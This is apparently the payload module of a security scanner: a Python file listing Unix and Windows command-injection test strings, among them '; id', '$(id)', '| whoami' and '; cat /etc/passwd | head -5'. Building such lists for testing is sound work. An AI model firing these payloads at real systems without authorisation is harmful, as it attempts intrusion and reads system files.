from dataclasses import dataclass


@dataclass
class Payload:
    value: str
    technique: str
    description: str = ""

# Commands that work on Linux/macOS
COMMAND_PAYLOADS = [
    Payload("; id", "command-injection", "Basic command injection via semicolon"),
    Payload("| id", "command-injection", "Basic command injection via pipe"),
    Payload("`id`", "command-injection", "Basic command injection via backticks"),
    Payload("$(id)", "command-injection", "Basic command injection via subshell"),
    Payload("; whoami", "command-injection", "Command injection - whoami"),
    Payload("| whoami", "command-injection", "Command injection via pipe - whoami"),
    Payload("; uname -a", "command-injection", "Command injection - system info"),
    Payload("| uname -a", "command-injection", "Command injection via pipe - system info"),
    Payload("; ls -la", "command-injection", "Command injection - directory listing"),
    Payload("| ls -la", "command-injection", "Command injection via pipe - ls"),
    Payload("; cat /etc/passwd | head -5", "command-injection", "Command injection - file read"),
    Payload("| cat /etc/passwd | head -5", "command-injection", "Command injection via pipe - file read"),
    Payload("; ping -c 1 127.0.0.1", "time-based", "Time-based command injection (ping)"),
    Payload("| ping -c 1 127.0.0.1", "time-based", "Time-based command injection via pipe"),
]

# Windows-specific payloads
WINDOWS_PAYLOADS = [
    Payload("& dir", "command-injection", "Windows command injection"),
    Payload("| dir", "command-injection", "Windows command injection via pipe"),
    Payload("& whoami", "command-injection", "Windows - whoami"),
    Payload("| whoami", "command-injection", "Windows - whoami via pipe"),
]
